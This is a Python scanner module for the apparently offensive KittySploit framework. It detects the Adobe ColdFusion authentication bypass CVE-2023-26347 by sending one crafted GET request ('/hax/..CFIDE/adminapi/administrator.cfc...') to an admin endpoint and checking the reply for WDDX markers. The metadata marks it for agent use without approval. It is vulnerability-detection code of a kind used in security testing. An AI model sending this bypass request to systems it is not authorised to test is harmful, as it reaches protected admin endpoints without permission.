#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Adobe ColdFusion versions 2023."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Adobe Coldfusion - Authentication Bypass Detection',
        'description': 'Adobe ColdFusion versions 2023.5 (and earlier) and 2021.11 (and earlier) are affected by an Improper Access Control vulnerability that could result in a Security feature bypass. An unauthenticated attacker could leverage this vulnerability to access the administration CFM and CFC endpoints. Exploitation of this issue does not require user interaction.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve2023', 'cve', 'adobe', 'coldfusion', 'auth-bypass', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-26347',
            'https://helpx.adobe.com/security/products/coldfusion/apsb23-52.html',
        ],
        'cve': 'CVE-2023-26347',
    }

    def run(self):
        path = '/hax/..CFIDE/adminapi/administrator.cfc?method=getBuildNumber&_cfclient=true'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('wddxPacket version=', '<string>',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Adobe Coldfusion - Authentication Bypass detected', path=path)
            return True
        return False

